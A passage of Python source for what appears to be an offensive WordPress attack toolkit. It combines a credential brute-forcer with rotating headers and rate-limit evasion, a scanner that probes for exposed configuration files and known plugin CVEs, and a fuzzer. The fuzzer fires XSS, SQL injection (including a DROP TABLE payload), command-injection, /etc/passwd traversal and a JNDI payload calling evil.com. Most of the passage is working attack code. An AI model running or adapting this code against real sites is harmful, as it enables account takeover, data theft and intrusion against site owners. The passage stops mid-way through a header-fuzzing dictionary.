        rate_limit_info = {
            'detected': False,
            'type': None,
            'recommended_delay': 1.0
        }
        
        try:
            # Send multiple rapid requests to test
            headers = self.ua_manager.get_rotating_headers()
            async with aiohttp.ClientSession() as session:
                responses = []
                
                for i in range(5):
                    try:
                        async with session.post(
                            login_url,
                            data={'log': 'test', 'pwd': 'test'},
                            headers=headers,
                            ssl=False
                        ) as response:
                            responses.append({
                                'status': response.status,
                                'headers': dict(response.headers),
                                'content': await response.text()
                            })
                    except:
                        continue
                    
                    await asyncio.sleep(0.1)
                
                # Analyze responses for rate limiting
                for resp in responses:
                    if resp['status'] == 429:
                        rate_limit_info['detected'] = True
                        rate_limit_info['type'] = 'HTTP 429'
                        rate_limit_info['recommended_delay'] = 5.0
                        break
                    
                    # Check for common WAF responses
                    content_lower = resp['content'].lower()
                    if any(indicator in content_lower for indicator in [
                        'rate limit', 'too many requests', 'blocked',
                        'security', 'captcha', 'forbidden'
                    ]):
                        rate_limit_info['detected'] = True
                        rate_limit_info['type'] = 'WAF/Rate Limiting'
                        rate_limit_info['recommended_delay'] = 3.0
                        break
        
        except Exception as e:
            logger.error(f"Rate limit detection failed: {e}")
        
        return rate_limit_info
    
    def _prioritize_combinations(self, users: List[str], passwords: List[str]) -> List[Tuple[str, str]]:
        """Prioritize username/password combinations intelligently"""
        combinations = []
        
        # Priority 1: User-specific passwords
        for user in users:
            user_specific = [
                user, user + '123', user + '2023', user + '2024', user + '2025',
                user + '!', user + '@', 'password', '123456'
            ]
            for pwd in user_specific:
                if pwd in passwords:
                    combinations.append((user, pwd))
        
        # Priority 2: Admin with common passwords
        if 'admin' in users:
            admin_passwords = [
                'admin', 'password', '123456', 'admin123', 'password123',
                'letmein', 'welcome', 'admin2023', 'admin2024', 'admin2025'
            ]
            for pwd in admin_passwords:
                if pwd in passwords:
                    combinations.append(('admin', pwd))
        
        # Priority 3: All other combinations (limited)
        remaining_combinations = [
            (user, pwd) for user in users for pwd in passwords[:100]  # Limit to top 100 passwords
            if (user, pwd) not in combinations
        ]
        
        combinations.extend(remaining_combinations[:1000])  # Limit total combinations
        
        return combinations
    
    def _attempt_login(self, login_url: str, username: str, password: str, report_file: str) -> Dict[str, Any]:
        """Attempt single login with enhanced detection"""
        result = {'success': False, 'error': None, 'response_info': {}}
        
        try:
            session = requests.Session()
            
            # Get login page first for CSRF tokens
            headers = self.ua_manager.get_rotating_headers()
            login_page = session.get(login_url, headers=headers, timeout=CONFIG['request_timeout'], verify=False)
            
            # Extract CSRF token if present
            csrf_token = None
            soup = BeautifulSoup(login_page.text, 'html.parser')
            
            # Look for various CSRF token fields
            csrf_fields = ['_wpnonce', 'wp_nonce', '_token', 'csrf_token']
            for field in csrf_fields:
                token_input = soup.find('input', {'name': field})
                if token_input and token_input.get('value'):
                    csrf_token = token_input['value']
                    break
            
            # Prepare login data
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': login_url.replace('/wp-login.php', '/wp-admin/'),
                'testcookie': '1'
            }
            
            if csrf_token:
                login_data['_wpnonce'] = csrf_token
            
            # Attempt login
            response = session.post(
                login_url,
                data=login_data,
                headers=headers,
                timeout=CONFIG['request_timeout'],
                verify=False,
                allow_redirects=True
            )
            
            result['response_info'] = {
                'status_code': response.status_code,
                'url': response.url,
                'headers': dict(response.headers)
            }
            
            # Check for successful login indicators
            success_indicators = [
                'wp-admin/index.php' in response.url,
                'dashboard' in response.url,
                'wp-admin' in response.url and response.status_code == 200,
                'howdy' in response.text.lower(),
                'logout' in response.text.lower() and 'login' not in response.text.lower()
            ]
            
            if any(success_indicators):
                result['success'] = True
                
                # Log successful login
                success_msg = f"[SUCCESS] Login: {username}:{password} -> {response.url}"
                logger.success(success_msg, "BRUTE_FORCE")
                
                with open(report_file, 'a', encoding='utf-8') as f:
                    f.write(f"\n{datetime.now()}: {success_msg}")
                
                return result
            
            # Check for various error conditions
            error_indicators = {
                'invalid_username': ['invalid username', 'unknown username'],
                'invalid_password': ['incorrect password', 'wrong password'],
                'captcha': ['captcha', 'recaptcha', 'hcaptcha'],
                'blocked': ['blocked', 'banned', 'suspended'],
                'rate_limited': ['too many', 'rate limit', 'slow down']
            }
            
            response_text_lower = response.text.lower()
            
            for error_type, indicators in error_indicators.items():
                if any(indicator in response_text_lower for indicator in indicators):
                    result['error'] = error_type
                    
                    if error_type == 'captcha':
                        logger.warning(f"CAPTCHA detected for {username}:{password}", "BRUTE_FORCE")
                    elif error_type == 'rate_limited':
                        logger.warning(f"Rate limiting detected for {username}:{password}", "BRUTE_FORCE")
                        time.sleep(self.rate_limit_delay * 2)  # Back off
                    
                    break
            
            # Rate limiting
            time.sleep(random.uniform(*CONFIG['delay_range']) + self.rate_limit_delay)
            
        except requests.exceptions.Timeout:
            result['error'] = 'timeout'
            logger.warning(f"Timeout for {username}:{password}")
        except requests.exceptions.ConnectionError:
            result['error'] = 'connection_error'
            logger.warning(f"Connection error for {username}:{password}")
        except Exception as e:
            result['error'] = f'exception: {str(e)}'
            logger.error(f"Login attempt error for {username}:{password}: {e}")
        
        return result

class AdvancedVulnerabilityScanner:
    def __init__(self, ua_manager: AdvancedUserAgentManager):
        self.ua_manager = ua_manager
        self.vulnerability_db = self._load_vulnerability_database()
        
    def _load_vulnerability_database(self) -> Dict[str, Any]:
        """Load comprehensive vulnerability database"""
        vuln_db = {
            'plugins': {
                'revslider': {
                    'versions': ['<=3.0.95', '<=4.6.5'],
                    'cves': ['CVE-2014-9735', 'CVE-2016-10924'],
                    'severity': 'critical',
                    'description': 'Revolution Slider Arbitrary File Upload',
                    'exploits': ['exploit-db: 35385', 'metasploit: wp_revslider_upload']
                },
                'wp-file-manager': {
                    'versions': ['<=6.8'],
                    'cves': ['CVE-2020-25213'],
                    'severity': 'critical',
                    'description': 'File Manager Remote Code Execution',
                    'exploits': ['exploit-db: 49178']
                },
                'wp-google-maps': {
                    'versions': ['<=7.11.18'],
                    'cves': ['CVE-2019-10692'],
                    'severity': 'high',
                    'description': 'WP Google Maps SQL Injection',
                    'exploits': []
                },
                'ultimate-member': {
                    'versions': ['<=2.1.3'],
                    'cves': ['CVE-2019-20441'],
                    'severity': 'critical',
                    'description': 'Ultimate Member Privilege Escalation',
                    'exploits': []
                },
                'elementor': {
                    'versions': ['<=2.7.0'],
                    'cves': ['CVE-2019-19822'],
                    'severity': 'medium',
                    'description': 'Elementor Arbitrary File Upload',
                    'exploits': []
                }
            },
            'themes': {
                'twentyseventeen': {
                    'versions': ['<=2.3'],
                    'cves': ['CVE-2019-17671'],
                    'severity': 'medium',
                    'description': 'Twenty Seventeen XSS Vulnerability'
                }
            },
            'core': {
                '4.7.0': ['CVE-2017-1001000'],
                '4.7.1': ['CVE-2017-1001000'],
                '5.0.0': ['CVE-2019-8942', 'CVE-2019-8943']
            }
        }
        
        # Load from external file if exists
        vuln_file = Path(CONFIG['vulns_db'])
        if vuln_file.exists():
            try:
                with open(vuln_file, 'r') as f:
                    external_db = json.load(f)
                    # Merge with default database
                    for category in external_db:
                        if category in vuln_db:
                            vuln_db[category].update(external_db[category])
                        else:
                            vuln_db[category] = external_db[category]
                logger.info(f"Loaded external vulnerability database from {vuln_file}")
            except Exception as e:
                logger.error(f"Failed to load vulnerability database: {e}")
        
        return vuln_db
    
    async def comprehensive_vulnerability_scan(self, url: str, wp_info: Dict[str, Any], report_file: str) -> List[Vulnerability]:
        """Comprehensive vulnerability scanning"""
        vulnerabilities = []
        
        # Core WordPress vulnerabilities
        if wp_info.get('version'):
            core_vulns = self._check_core_vulnerabilities(wp_info['version'])
            vulnerabilities.extend(core_vulns)
        
        # Plugin vulnerabilities
        if wp_info.get('plugins'):
            plugin_vulns = await self._scan_plugin_vulnerabilities(url, wp_info['plugins'])
            vulnerabilities.extend(plugin_vulns)
        
        # Theme vulnerabilities
        if wp_info.get('theme'):
            theme_vulns = await self._scan_theme_vulnerabilities(url, wp_info['theme'])
            vulnerabilities.extend(theme_vulns)
        
        # Configuration vulnerabilities
        config_vulns = await self._scan_configuration_issues(url)
        vulnerabilities.extend(config_vulns)
        
        # Common file exposures
        file_vulns = await self._scan_sensitive_files(url)
        vulnerabilities.extend(file_vulns)
        
        # Web application vulnerabilities
        webapp_vulns = await self._scan_webapp_vulnerabilities(url)
        vulnerabilities.extend(webapp_vulns)
        
        # Log findings
        if vulnerabilities:
            logger.critical(f"Found {len(vulnerabilities)} vulnerabilities!", "VULNERABILITY")
            for vuln in vulnerabilities:
                logger.vuln(f"{vuln.severity.upper()}: {vuln.name} - {vuln.description}")
                
                # Write to report
                with open(report_file, 'a', encoding='utf-8') as f:
                    f.write(f"\n[VULNERABILITY] {vuln.severity.upper()}: {vuln.name}")
                    f.write(f"\nDescription: {vuln.description}")
                    if vuln.cve:
                        f.write(f"\nCVE: {vuln.cve}")
                    f.write(f"\nTimestamp: {datetime.now()}\n")
        else:
            logger.info("No known vulnerabilities detected", "VULNERABILITY")
        
        return vulnerabilities
    
    def _check_core_vulnerabilities(self, version: str) -> List[Vulnerability]:
        """Check WordPress core vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Parse version
            version_parts = [int(x) for x in version.split('.')]
            
            # Known vulnerable versions
            vulnerable_versions = {
                (4, 7, 0): ['CVE-2017-1001000'],
                (4, 7, 1): ['CVE-2017-1001000'],
                (5, 0, 0): ['CVE-2019-8942', 'CVE-2019-8943']
            }
            
            # Check for exact matches first
            version_tuple = tuple(version_parts)
            if version_tuple in vulnerable_versions:
                for cve in vulnerable_versions[version_tuple]:
                    vulnerabilities.append(Vulnerability(
                        name=f"WordPress Core {version}",
                        severity='high',
                        description=f"WordPress core version {version} has known vulnerabilities",
                        cve=cve
                    ))
            
            # Check for range vulnerabilities (versions before certain patches)
            if version_tuple < (4, 7, 2):
                vulnerabilities.append(Vulnerability(
                    name="WordPress Core - REST API Exposure",
                    severity='medium',
                    description="WordPress versions before 4.7.2 expose user data via REST API",
                    cve='CVE-2017-1001000'
                ))
            
            if version_tuple < (5, 2, 3):
                vulnerabilities.append(Vulnerability(
                    name="WordPress Core - Multiple Vulnerabilities",
                    severity='high',
                    description="WordPress versions before 5.2.3 have multiple security issues"
                ))
                
        except Exception as e:
            logger.error(f"Error checking core vulnerabilities: {e}")
        
        return vulnerabilities
    
    async def _scan_plugin_vulnerabilities(self, url: str, plugins: List[str]) -> List[Vulnerability]:
        """Scan for vulnerable plugins"""
        vulnerabilities = []
        
        for plugin in plugins:
            try:
                # Check if plugin exists in our vulnerability database
                if plugin in self.vulnerability_db['plugins']:
                    vuln_info = self.vulnerability_db['plugins'][plugin]
                    
                    # Try to detect version (basic implementation)
                    plugin_version = await self._detect_plugin_version(url, plugin)
                    
                    vulnerability = Vulnerability(
                        name=f"Plugin: {plugin}",
                        severity=vuln_info['severity'],
                        description=vuln_info['description'],
                        cve=vuln_info.get('cves', [None])[0]  # First CVE if available
                    )
                    
                    if vuln_info.get('exploits'):
                        vulnerability.exploit_available = True
                        vulnerability.references = vuln_info['exploits']
                    
                    vulnerabilities.append(vulnerability)
                    
                    logger.vuln(f"Vulnerable plugin detected: {plugin}")
                
                # Check if plugin directory is accessible (information disclosure)
                plugin_url = f"{url}/wp-content/plugins/{plugin}/"
                try:
                    headers = self.ua_manager.get_rotating_headers()
                    async with aiohttp.ClientSession() as session:
                        async with session.get(plugin_url, headers=headers, ssl=False) as response:
                            if response.status == 200:
                                content = await response.text()
                                if 'index of' in content.lower():
                                    vulnerabilities.append(Vulnerability(
                                        name=f"Plugin Directory Listing: {plugin}",
                                        severity='low',
                                        description=f"Plugin directory {plugin} allows directory listing"
                                    ))
                except:
                    pass
            
            except Exception as e:
                logger.error(f"Error scanning plugin {plugin}: {e}")
        
        return vulnerabilities
    
    async def _detect_plugin_version(self, url: str, plugin: str) -> Optional[str]:
        """Attempt to detect plugin version"""
        try:
            # Common version detection methods
            version_urls = [
                f"{url}/wp-content/plugins/{plugin}/readme.txt",
                f"{url}/wp-content/plugins/{plugin}/README.txt",
                f"{url}/wp-content/plugins/{plugin}/{plugin}.php"
            ]
            
            headers = self.ua_manager.get_rotating_headers()
            async with aiohttp.ClientSession() as session:
                for version_url in version_urls:
                    try:
                        async with session.get(version_url, headers=headers, ssl=False) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Look for version patterns
                                version_patterns = [
                                    r'Stable tag:\s*([0-9.]+)',
                                    r'Version:\s*([0-9.]+)',
                                    r'version\s*=\s*["\']([0-9.]+)["\']'
                                ]
                                
                                for pattern in version_patterns:
                                    match = re.search(pattern, content, re.IGNORECASE)
                                    if match:
                                        return match.group(1)
                    except:
                        continue
        except:
            pass
        
        return None
    
    async def _scan_theme_vulnerabilities(self, url: str, theme: str) -> List[Vulnerability]:
        """Scan for vulnerable themes"""
        vulnerabilities = []
        
        try:
            if theme in self.vulnerability_db.get('themes', {}):
                vuln_info = self.vulnerability_db['themes'][theme]
                
                vulnerability = Vulnerability(
                    name=f"Theme: {theme}",
                    severity=vuln_info['severity'],
                    description=vuln_info['description'],
                    cve=vuln_info.get('cve')
                )
                
                vulnerabilities.append(vulnerability)
                logger.vuln(f"Vulnerable theme detected: {theme}")
            
            # Check for theme directory listing
            theme_url = f"{url}/wp-content/themes/{theme}/"
            try:
                headers = self.ua_manager.get_rotating_headers()
                async with aiohttp.ClientSession() as session:
                    async with session.get(theme_url, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            content = await response.text()
                            if 'index of' in content.lower():
                                vulnerabilities.append(Vulnerability(
                                    name=f"Theme Directory Listing: {theme}",
                                    severity='low',
                                    description=f"Theme directory {theme} allows directory listing"
                                ))
            except:
                pass
                
        except Exception as e:
            logger.error(f"Error scanning theme {theme}: {e}")
        
        return vulnerabilities
    
    async def _scan_configuration_issues(self, url: str) -> List[Vulnerability]:
        """Scan for WordPress configuration issues"""
        vulnerabilities = []
        
        config_checks = {
            '/wp-config.php': 'WordPress Configuration File Exposure',
            '/wp-config.php.bak': 'WordPress Configuration Backup Exposure',
            '/wp-config-sample.php': 'WordPress Sample Configuration Exposure',
            '/.htaccess': 'Apache Configuration File Exposure',
            '/wp-admin/install.php': 'WordPress Installation File Accessible',
            '/wp-admin/setup-config.php': 'WordPress Setup Configuration Accessible'
        }
        
        headers = self.ua_manager.get_rotating_headers()
        async with aiohttp.ClientSession() as session:
            for endpoint, description in config_checks.items():
                try:
                    async with session.get(url + endpoint, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Check if it's actually the config file (not 404 page)
                            if any(indicator in content.lower() for indicator in [
                                'db_name', 'db_user', 'db_password', 'auth_key', 'secure_auth_key'
                            ]):
                                vulnerabilities.append(Vulnerability(
                                    name="Configuration File Exposure",
                                    severity='critical',
                                    description=f"{description}: {endpoint}"
                                ))
                                logger.critical(f"CRITICAL: {description} at {endpoint}")
                            elif endpoint.endswith('.php') and 'install' in endpoint:
                                vulnerabilities.append(Vulnerability(
                                    name="Installation File Accessible",
                                    severity='medium',
                                    description=f"{description}: {endpoint}"
                                ))
                
                except:
                    continue
                
                await asyncio.sleep(0.1)  # Rate limiting
        
        return vulnerabilities
    
    async def _scan_sensitive_files(self, url: str) -> List[Vulnerability]:
        """Scan for sensitive file exposures"""
        vulnerabilities = []
        
        sensitive_files = {
            '/robots.txt': {'severity': 'info', 'check': 'disallow'},
            '/sitemap.xml': {'severity': 'info', 'check': 'xml'},
            '/wp-sitemap.xml': {'severity': 'info', 'check': 'xml'},
            '/readme.html': {'severity': 'low', 'check': 'wordpress'},
            '/license.txt': {'severity': 'low', 'check': 'gpl'},
            '/wp-admin/readme.html': {'severity': 'low', 'check': 'wordpress'},
            '/wp-includes/version.php': {'severity': 'medium', 'check': 'wp_version'},
            '/wp-content/debug.log': {'severity': 'high', 'check': 'php'},
            '/.git/': {'severity': 'high', 'check': 'git'},
            '/.svn/': {'severity': 'medium', 'check': 'svn'},
            '/backup/': {'severity': 'high', 'check': 'index'},
            '/backups/': {'severity': 'high', 'check': 'index'},
            '/wp-content/uploads/': {'severity': 'medium', 'check': 'index'},
            '/xmlrpc.php': {'severity': 'medium', 'check': 'xmlrpc'}
        }
        
        headers = self.ua_manager.get_rotating_headers()
        async with aiohttp.ClientSession() as session:
            for file_path, config in sensitive_files.items():
                try:
                    async with session.get(url + file_path, headers=headers, ssl=False) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            # Verify it's actually the expected file
                            check_passed = False
                            if config['check'] == 'disallow' and 'disallow:' in content.lower():
                                check_passed = True
                            elif config['check'] == 'xml' and '<?xml' in content:
                                check_passed = True
                            elif config['check'] == 'wordpress' and 'wordpress' in content.lower():
                                check_passed = True
                            elif config['check'] == 'gpl' and 'gpl' in content.lower():
                                check_passed = True
                            elif config['check'] == 'wp_version' and '$wp_version' in content:
                                check_passed = True
                            elif config['check'] == 'php' and ('php' in content.lower() or 'error' in content.lower()):
                                check_passed = True
                            elif config['check'] == 'git' and 'ref:' in content.lower():
                                check_passed = True
                            elif config['check'] == 'svn' and 'svn' in content.lower():
                                check_passed = True
                            elif config['check'] == 'index' and ('index of' in content.lower() or '<a href=' in content):
                                check_passed = True
                            elif config['check'] == 'xmlrpc' and 'xml-rpc' in content.lower():
                                check_passed = True
                            
                            if check_passed:
                                vulnerabilities.append(Vulnerability(
                                    name=f"Sensitive File Exposure",
                                    severity=config['severity'],
                                    description=f"Sensitive file exposed: {file_path}"
                                ))
                                
                                if config['severity'] in ['high', 'critical']:
                                    logger.critical(f"SENSITIVE FILE: {file_path}")
                                else:
                                    logger.info(f"File found: {file_path}")
                
                except:
                    continue
                
                await asyncio.sleep(0.1)
        
        return vulnerabilities
    
    async def _scan_webapp_vulnerabilities(self, url: str) -> List[Vulnerability]:
        """Scan for common web application vulnerabilities"""
        vulnerabilities = []
        
        # XSS Testing
        xss_vulns = await self._test_xss_vulnerabilities(url)
        vulnerabilities.extend(xss_vulns)
        
        # SQL Injection Testing
        sqli_vulns = await self._test_sql_injection(url)
        vulnerabilities.extend(sqli_vulns)
        
        # CSRF Testing
        csrf_vulns = await self._test_csrf_protection(url)
        vulnerabilities.extend(csrf_vulns)
        
        # Directory Traversal
        lfi_vulns = await self._test_directory_traversal(url)
        vulnerabilities.extend(lfi_vulns)
        
        return vulnerabilities
    
    async def _test_xss_vulnerabilities(self, url: str) -> List[Vulnerability]:
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "'><img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
        
        test_params = ['s', 'search', 'q', 'query', 'p', 'page', 'cat', 'category', 'tag']
        
        headers = self.ua_manager.get_rotating_headers()
        async with aiohttp.ClientSession() as session:
            for param in test_params:
                for payload in xss_payloads[:5]:  # Limit payloads per param
                    try:
                        test_url = f"{url}/?{param}={payload}"
                        async with session.get(test_url, headers=headers, ssl=False) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check if payload is reflected without encoding
                                if payload in content:
                                    vulnerabilities.append(Vulnerability(
                                        name="Reflected XSS",
                                        severity='high',
                                        description=f"XSS vulnerability in parameter '{param}': {test_url}"
                                    ))
                                    logger.vuln(f"XSS found in parameter: {param}")
                                    break  # Found XSS in this param, move to next
                    
                    except:
                        continue
                    
                    await asyncio.sleep(0.2)
        
        return vulnerabilities
    
    async def _test_sql_injection(self, url: str) -> List[Vulnerability]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        sqli_payloads = [
            "'", '"', "1'", "1\"", 
            "' OR 1=1 --", "\" OR 1=1 --",
            "' UNION SELECT NULL --", "\" UNION SELECT NULL --",
            "'; DROP TABLE wp_users; --",
            "1' AND (SELECT COUNT(*) FROM wp_users) > 0 --"
        ]
        
        error_patterns = [
            r'mysql_fetch_array\(\)',
            r'Warning.*mysql_.*',
            r'valid MySQL result',
            r'MySQLSyntaxErrorException',
            r'SQLException',
            r'ORA-[0-9]+',
            r'Microsoft.*ODBC.*SQL Server',
            r'SQLServer JDBC Driver'
        ]
        
        test_params = ['id', 'p', 'page_id', 'cat', 'author', 'm', 'year', 'monthnum', 'day']
        
        headers = self.ua_manager.get_rotating_headers()
        async with aiohttp.ClientSession() as session:
            for param in test_params:
                for payload in sqli_payloads[:3]:  # Limit payloads
                    try:
                        test_url = f"{url}/?{param}={payload}"
                        async with session.get(test_url, headers=headers, ssl=False) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check for SQL error patterns
                                for pattern in error_patterns:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        vulnerabilities.append(Vulnerability(
                                            name="SQL Injection",
                                            severity='critical',
                                            description=f"SQL injection vulnerability in parameter '{param}': {test_url}"
                                        ))
                                        logger.vuln(f"SQL Injection found in parameter: {param}")
                                        break
                    
                    except:
                        continue
                    
                    await asyncio.sleep(0.3)
        
        return vulnerabilities
    
    async def _test_csrf_protection(self, url: str) -> List[Vulnerability]:
        """Test for CSRF protection"""
        vulnerabilities = []
        
        try:
            login_url = f"{url}/wp-login.php"
            headers = self.ua_manager.get_rotating_headers()
            
            async with aiohttp.ClientSession() as session:
                async with session.get(login_url, headers=headers, ssl=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for CSRF tokens
                        csrf_patterns = [
                            r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']',
                            r'name=["\']wp_nonce["\'][^>]*value=["\']([^"\']+)["\']',
                            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']'
                        ]
                        
                        csrf_found = False
                        for pattern in csrf_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                csrf_found = True
                                break
                        
                        if not csrf_found:
                            vulnerabilities.append(Vulnerability(
                                name="Missing CSRF Protection",
                                severity='medium',
                                description="Login form lacks CSRF protection tokens"
                            ))
                            logger.warning("No CSRF protection detected on login form")
        
        except:
            pass
        
        return vulnerabilities
    
    async def _test_directory_traversal(self, url: str) -> List[Vulnerability]:
        """Test for directory traversal vulnerabilities"""
        vulnerabilities = []
        
        lfi_payloads = [
            "../wp-config.php",
            "../../wp-config.php",
            "../../../wp-config.php",
            "....//wp-config.php",
            "..%2fwp-config.php",
            "..%252fwp-config.php",
            "/etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd"
        ]
        
        test_params = ['file', 'path', 'include', 'page', 'template', 'load']
        
        headers = self.ua_manager.get_rotating_headers()
        async with aiohttp.ClientSession() as session:
            for param in test_params:
                for payload in lfi_payloads[:3]:  # Limit payloads
                    try:
                        test_url = f"{url}/?{param}={payload}"
                        async with session.get(test_url, headers=headers, ssl=False) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check for successful file inclusion
                                success_indicators = [
                                    'DB_NAME', 'DB_USER', 'DB_PASSWORD',  # wp-config.php
                                    'root:x:0:0:', 'daemon:x:',  # /etc/passwd
                                    'AUTH_KEY', 'SECURE_AUTH_KEY'  # wp-config.php
                                ]
                                
                                if any(indicator in content for indicator in success_indicators):
                                    vulnerabilities.append(Vulnerability(
                                        name="Directory Traversal / LFI",
                                        severity='critical',
                                        description=f"Directory traversal vulnerability in parameter '{param}': {test_url}"
                                    ))
                                    logger.vuln(f"Directory traversal found in parameter: {param}")
                                    break
                    
                    except:
                        continue
                    
                    await asyncio.sleep(0.3)
        
        return vulnerabilities

class AdvancedFuzzer:
    def __init__(self, ua_manager: AdvancedUserAgentManager):
        self.ua_manager = ua_manager
        
    async def intelligent_fuzzing(self, url: str, report_file: str) -> List[Dict[str, Any]]:
        """Intelligent fuzzing for zero-day discovery"""
        findings = []
        
        # Parameter fuzzing
        param_findings = await self._fuzz_parameters(url)
        findings.extend(param_findings)
        
        # Header fuzzing
        header_findings = await self._fuzz_headers(url)
        findings.extend(header_findings)
        
        # File extension fuzzing
        file_findings = await self._fuzz_file_extensions(url)
        findings.extend(file_findings)
        
        # Method fuzzing
        method_findings = await self._fuzz_http_methods(url)
        findings.extend(method_findings)
        
        # Content-Type fuzzing
        content_type_findings = await self._fuzz_content_types(url)
        findings.extend(content_type_findings)
        
        # Log findings
        if findings:
            logger.success(f"Fuzzing completed: {len(findings)} anomalies found")
            
            with open(report_file, 'a', encoding='utf-8') as f:
                f.write(f"\n=== FUZZING RESULTS ===\n")
                for finding in findings:
                    f.write(f"Type: {finding['type']}\n")
                    f.write(f"URL: {finding['url']}\n")
                    f.write(f"Response: {finding['status_code']}\n")
                    f.write(f"Description: {finding['description']}\n")
                    f.write(f"Timestamp: {finding['timestamp']}\n\n")
        else:
            logger.info("Fuzzing completed: No significant anomalies detected")
        
        return findings
    
    async def _fuzz_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Fuzz URL parameters"""
        findings = []
        
        # Smart payload generation
        payloads = {
            'sql_injection': [
                "'", '"', "1'", "1\"", "' OR 1=1 --", "\" OR 1=1 --",
                "'; DROP TABLE wp_users; --", "1' UNION SELECT NULL --"
            ],
            'xss': [
                "<script>alert(1)</script>", "'><img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>", "javascript:alert(1)"
            ],
            'command_injection': [
                "|id", ";id", "&id", "`id`", "$(id)", "${id}",
                "|whoami", ";whoami", "&whoami"
            ],
            'directory_traversal': [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd", "../wp-config.php"
            ],
            'template_injection': [
                "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
                "{{config.items()}}", "${jndi:ldap://evil.com/a}"
            ],
            'buffer_overflow': [
                "A" * 1000, "A" * 5000, "A" * 10000,
                "%n" * 100, "%x" * 100
            ]
        }
        
        common_params = [
            'id', 'p', 'page_id', 'cat', 'tag', 's', 'search', 'q',
            'file', 'path', 'include', 'template', 'load', 'view',
            'action', 'cmd', 'exec', 'system', 'eval'
        ]
        
        async with aiohttp.ClientSession() as session:
            for payload_type, payload_list in payloads.items():
                for param in common_params:
                    for payload in payload_list[:2]:  # Limit payloads per param
                        try:
                            test_url = f"{url}/?{param}={payload}"
                            headers = self.ua_manager.get_rotating_headers()
                            
                            async with session.get(test_url, headers=headers, ssl=False) as response:
                                status_code = response.status
                                content = await response.text()
                                response_time = response.headers.get('X-Response-Time', 'unknown')
                                
                                # Analyze response for anomalies
                                anomaly_detected = False
                                description = ""
                                
                                # Check for error messages
                                error_patterns = [
                                    r'mysql_fetch_array\(\)', r'Warning.*mysql_.*',
                                    r'Fatal error', r'Parse error', r'Notice:',
                                    r'undefined index', r'undefined variable',
                                    r'stack trace', r'exception', r'traceback'
                                ]
                                
                                for pattern in error_patterns:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        anomaly_detected = True
                                        description = f"Error message detected with {payload_type} payload"
                                        break
                                
                                # Check for unusual status codes
                                if status_code in [500, 502, 503, 504]:
                                    anomaly_detected = True
                                    description = f"Server error ({status_code}) with {payload_type} payload"
                                
                                # Check for reflection of payload
                                if payload in content and payload_type == 'xss':
                                    anomaly_detected = True
                                    description = f"XSS payload reflected in response"
                                
                                # Check for command execution indicators
                                if payload_type == 'command_injection':
                                    cmd_indicators = ['uid=', 'gid=', 'groups=', 'root:', 'bin/bash']
                                    if any(indicator in content for indicator in cmd_indicators):
                                        anomaly_detected = True
                                        description = "Possible command injection vulnerability"
                                
                                # Check for file inclusion
                                if payload_type == 'directory_traversal':
                                    file_indicators = ['root:x:', 'daemon:x:', 'DB_NAME', 'DB_USER']
                                    if any(indicator in content for indicator in file_indicators):
                                        anomaly_detected = True
                                        description = "Possible directory traversal vulnerability"
                                
                                if anomaly_detected:
                                    findings.append({
                                        'type': f'Parameter Fuzzing - {payload_type}',
                                        'url': test_url,
                                        'parameter': param,
                                        'payload': payload,
                                        'status_code': status_code,
                                        'description': description,
                                        'timestamp': datetime.now().isoformat()
                                    })
                                    
                                    logger.warning(f"Anomaly detected: {description} - {test_url}")
                        
                        except Exception as e:
                            logger.error(f"Fuzzing error for {param}={payload}: {e}")
                        
                        await asyncio.sleep(0.2)  # Rate limiting
        
        return findings
    
    async def _fuzz_headers(self, url: str) -> List[Dict[str, Any]]:
        """Fuzz HTTP headers"""
        findings = []
        
        # Test headers that might cause interesting responses
        test_headers = {
            'X-Forwarded-For': ['127.0.0.1', '192.168.1.1', '10.0.0.1', '169.254.169.254'],
            'X-Real-IP': ['127.0.0.1', '192.168.1.1'],
            'X-Originating-IP': ['127.0.0.1'],
            'X-Remote-IP': ['127.0.0.1'],
            'X-Client-IP': ['127.0.0.1'],
            'Client-IP': ['127.0.0.1'],
            'CF-Connecting-IP': ['127.0.0.1'],
            'True-Client-IP': ['127.0.0.1'],
            'X-Forwarded-Host': ['evil.com', 'localhost', '127.0.0.1'],
            'Host': ['evil.com', 'localhost'],
            'Origin': ['https://evil.com'],
            'Referer': ['https://evil.com/'],
            'User-Agent': ['<script>alert(1)</script>', 'sqlmap/1.0', '../../../etc/passwd'],
            'Accept': ['../../../etc/passwd', '<script>alert(1)</script>'],
            'Accept-Language': ['<script>alert(1)</script>'],
            'Accept-Encoding': ['<script>alert(1)</script>'],
            'Cookie': ['PHPSESSID=../../../etc/passwd', 'admin=true', 'role=administrator'],
            'Authorization': ['Basic YWRtaW46YWRtaW4=', 'Bearer admin', 'admin:admin'],
            'Content-Type': ['application/json', 'text/xml', 'application/xml'],
            'X-HTTP-Method-Override': ['PUT', 'DELETE', 'PATCH'],
            'X-Method-Override': ['PUT', 'DELETE'],
        }
